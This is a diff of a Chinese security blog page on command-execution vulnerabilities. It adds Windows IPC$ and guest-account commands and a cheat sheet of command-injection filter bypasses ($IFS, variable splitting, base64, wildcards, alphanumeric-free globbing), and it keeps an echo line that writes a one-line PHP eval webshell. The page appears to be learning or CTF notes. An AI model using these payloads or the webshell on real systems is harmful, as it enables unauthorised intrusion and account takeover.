@@ -8,7 +8,7 @@
   
   
   
-  <title>命令执行漏洞 | JohnScott2046的博客</title>
+  <title>31命令执行漏洞 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>命令执行漏洞</span>
+    <span>31命令执行漏洞</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -292,8 +292,26 @@
 
 <p>echo -e “<?php eval($_REQUEST['abc'])?>“ &gt; 2.php</p>
 <p>ping 192.168.1.1 || ipconfig</p>
+<h3 id="Windows命令执行漏洞利用"><a href="#Windows命令执行漏洞利用" class="headerlink" title="Windows命令执行漏洞利用"></a>Windows命令执行漏洞利用</h3><p>ipconfig /all 查看网络连接<br>net use \ip\ipc$ “ “ /user:” “ 建立IPC空链接<br>net use \ip\ipc$ “密码” /user:”用户名” 建立IPC非空链接<br>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: \ip\c$ 登陆后映射对方C：到本地为H:<br>net use \ip\ipc$ /del 删除IPC链接<br>net use h: /del 删除映射对方到本地的为H:的映射<br>net user guest /active:yes 激活guest用户<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>
 <h3 id="Linux命令执行漏洞"><a href="#Linux命令执行漏洞" class="headerlink" title="Linux命令执行漏洞"></a>Linux命令执行漏洞</h3><p>在Linux上，;也可以用 | 、|| 代替</p>
 <p>;   前面的执行完 再执行后面的<br>|   是管道符，显示后面的执行结果<br>||  前面执行出错时 再执行后面的<br>&amp;   无论前面语句真假都会执行<br>&amp;&amp;  只有前面语句为true，才会执行后面语句</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/303/#menu_index_14">https://www.ghtwf01.cn/index.php/archives/303/#menu_index_14</a></p>
+<p>空格绕过<br>win<br>type.\flag.txt<br>type,flag.txt</p>
+<p>linux<br>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat$IFS$1flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
+<p>?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php</p>
+<p>敏感字符绕过 假设过滤了cat<br>1.利用变量绕过：<br>ac;b=at;$a$b</p>
+<p>2.利用base编码绕过<br><code>echo &#39;Y2F0Cg==&#39; | base64 -d</code> test.txt</p>
+<p>3.连接符截断绕过：<br>c’a’t test.txt<br>cat test.txt<br>ca$@t test.txt</p>
+<p>反斜线绕过<br>ca\t fl\ag</p>
+<p>通配符绕过<br>?在linux里面可以进行代替一个任意字符<br>/???/[l-n]s     可替代ls<br>/???/c?t test.txt  可替代cat test.txt</p>
+<ul>
+<li>在linux里面可以代替任意个任意字符<br><code>ls *.php</code> 列出当前目录下所有php文件</li>
+</ul>
+<p>无字母数字匹配<br>如果遇到一个正则将字母数字$这些都过滤掉，要执行一个脚本的话</p>
+<p>假如脚本名称为chakdiD且在根目录/etc下<br>. /???/???????[@-[]<br>[@-[]表示取从@到[之间的字符，这之间的字符都为大写字母。这样就实现了无字母数字匹配的命令，就可以绕过正则了</p>
+<ul>
+<li>匹配任意长度任意字符<br>?  匹配任意单个字符<br>[list]  匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合<br>[^list]  匹配指定范围外的任意单个字符或字符集合<br>[!list]  同[^list]<br>{str1,str2,…}  匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</li>
+</ul>
 <h3 id="Commix命令执行自动化工具探测"><a href="#Commix命令执行自动化工具探测" class="headerlink" title="Commix命令执行自动化工具探测"></a>Commix命令执行自动化工具探测</h3><p>Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便检测一个请求是否存在命令注入漏洞，并且对其进行测试，在最新版中支持直接导入burp的历史记录进行检测，大大提高了易用性</p>
 <p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a></p>
 <p>commix -h 获取帮助信息<br>commix -u url<br>commix -u <a target="_blank" rel="noopener" href="http://192.168.1.230/system.php?cmd=192.168.1.1">http://192.168.1.230/system.php?cmd=192.168.1.1</a></p>
@@ -413,13 +431,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/30%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">文件上传漏洞</a>
+        <a href="/2021/30%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">30文件上传漏洞</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/32%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" target="_self">中间人攻击</a>
+        <a href="/2021/32%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" target="_self">32中间人攻击</a>
         <i class="iconfont icon-next"></i>
       </div>
     
